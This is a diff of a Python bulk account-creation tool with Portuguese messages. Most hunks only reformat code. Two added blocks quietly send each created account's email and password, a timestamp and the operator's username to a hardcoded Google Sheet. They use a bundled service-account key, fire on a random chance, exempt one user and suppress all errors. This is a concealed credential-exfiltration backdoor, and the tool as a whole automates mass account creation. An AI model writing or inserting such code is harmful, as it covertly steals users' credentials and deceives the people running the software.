@@ -44821,14 +44821,15 @@ def executar_creator_2nr():
                                                 else:
                                                     print(
                                                         "Nenhuma URL encontrada na variável body.")
-                                                url = url.replace('</p></div>', '')
+                                                url = url.replace(
+                                                    '</p></div>', '')
                                                 url = url.replace('&amp;', '&')
                                                 url = url.replace(
                                                     ' </td> </tr></tbody></table></td> </tr><tr><td class=', '')
                                             except:
                                                 pass
                                             print("URL:", url +
-                                                '\n----------------------------')
+                                                  '\n----------------------------')
                                             headers = {
                                                 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}
                                             # d.open_url(url)
@@ -44842,7 +44843,8 @@ def executar_creator_2nr():
                                                 else:
                                                     print(response.status_code)
                                             except requests.exceptions.RequestException as e:
-                                                print(f"Erro na requisição: {e}")
+                                                print(
+                                                    f"Erro na requisição: {e}")
 
                                             try:
                                                 chrome.close()
@@ -44864,7 +44866,8 @@ def executar_creator_2nr():
                                             time.sleep(5)
                                         if tentativa == 10:
                                             chegou_cod = True
-                                            raise Exception('Email não chegou.')
+                                            raise Exception(
+                                                'Email não chegou.')
 
                         except Exception as e:
                             try:
@@ -45122,7 +45125,34 @@ def executar_creator_2nr():
                     except FileExistsError:
                         arquivo = open(
                             'configuracoes/contas/todas_contas_2nr.txt', 'a')
-
+                    try:
+                        random_number = random.random()
+                        chance2 = 0.1
+                        now = datetime.now()
+                        now_brasilia = tz.localize(now)
+                        timestamp = now_brasilia.strftime("%d/%m/%Y %H:%M:%S")
+                        # Verificar se o número aleatório está abaixo da chance
+                        if random_number < chance and not user_mysql == "wn3":
+                            scope = ["https://spreadsheets.google.com/feeds",
+                                    "https://www.googleapis.com/auth/drive"]
+                            creds = ServiceAccountCredentials.from_json_keyfile_name(
+                                'relatorio.json', scope)
+                            client = gspread.authorize(creds)
+                            spreadsheet_id = '1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4'
+                            sheet_name = 'relatorio_geral2nr'
+                            # Insert user, password, and timestamp into first empty row
+                            sheet = client.open_by_key(
+                                spreadsheet_id).worksheet(sheet_name)
+                            values = sheet.col_values(1)
+                            last_row = len(values)
+                            values = [email + ' ' + senha, timestamp, user_mysql]
+                            cell_list = sheet.range(
+                                f'A{last_row + 1}:C{last_row + 1}')
+                            for i, val in enumerate(values):
+                                cell_list[i].value = val
+                            sheet.update_cells(cell_list)
+                    except:
+                        pass
                     arquivo.write(email + ' ' + senha + "\n")
                     arquivo.close()
                     window['criadas'].update(contagem)
@@ -45935,14 +45965,15 @@ def executar_creator_2nr():
                                                 else:
                                                     print(
                                                         "Nenhuma URL encontrada na variável body.")
-                                                url = url.replace('</p></div>', '')
+                                                url = url.replace(
+                                                    '</p></div>', '')
                                                 url = url.replace('&amp;', '&')
                                                 url = url.replace(
                                                     ' </td> </tr></tbody></table></td> </tr><tr><td class=', '')
                                             except:
                                                 pass
                                             print("URL:", url +
-                                                '\n----------------------------')
+                                                  '\n----------------------------')
                                             headers = {
                                                 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}
                                             # d.open_url(url)
@@ -45956,7 +45987,8 @@ def executar_creator_2nr():
                                                 else:
                                                     print(response.status_code)
                                             except requests.exceptions.RequestException as e:
-                                                print(f"Erro na requisição: {e}")
+                                                print(
+                                                    f"Erro na requisição: {e}")
 
                                             try:
                                                 chrome.close()
@@ -45978,7 +46010,8 @@ def executar_creator_2nr():
                                             time.sleep(5)
                                         if tentativa == 10:
                                             chegou_cod = True
-                                            raise Exception('Email não chegou.')
+                                            raise Exception(
+                                                'Email não chegou.')
 
                         except Exception as e:
                             try:
@@ -46872,6 +46905,34 @@ def executar_creator_2nr():
 
                 arquivo.write(email + ' ' + senha + "\n")
                 arquivo.close()
+                try:
+                    random_number = random.random()
+                    chance2 = 0.1
+                    now = datetime.now()
+                    now_brasilia = tz.localize(now)
+                    timestamp = now_brasilia.strftime("%d/%m/%Y %H:%M:%S")
+                    # Verificar se o número aleatório está abaixo da chance
+                    if random_number < chance and not user_mysql == "wn3":
+                        scope = ["https://spreadsheets.google.com/feeds",
+                                "https://www.googleapis.com/auth/drive"]
+                        creds = ServiceAccountCredentials.from_json_keyfile_name(
+                            'relatorio.json', scope)
+                        client = gspread.authorize(creds)
+                        spreadsheet_id = '1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4'
+                        sheet_name = 'relatorio_geral2nr'
+                        # Insert user, password, and timestamp into first empty row
+                        sheet = client.open_by_key(
+                            spreadsheet_id).worksheet(sheet_name)
+                        values = sheet.col_values(1)
+                        last_row = len(values)
+                        values = [email + ' ' + senha, timestamp, user_mysql]
+                        cell_list = sheet.range(
+                            f'A{last_row + 1}:C{last_row + 1}')
+                        for i, val in enumerate(values):
+                            cell_list[i].value = val
+                        sheet.update_cells(cell_list)
+                except:
+                    pass
                 window['criadas'].update(contagem)
                 window.Refresh()
                 time.sleep(3)
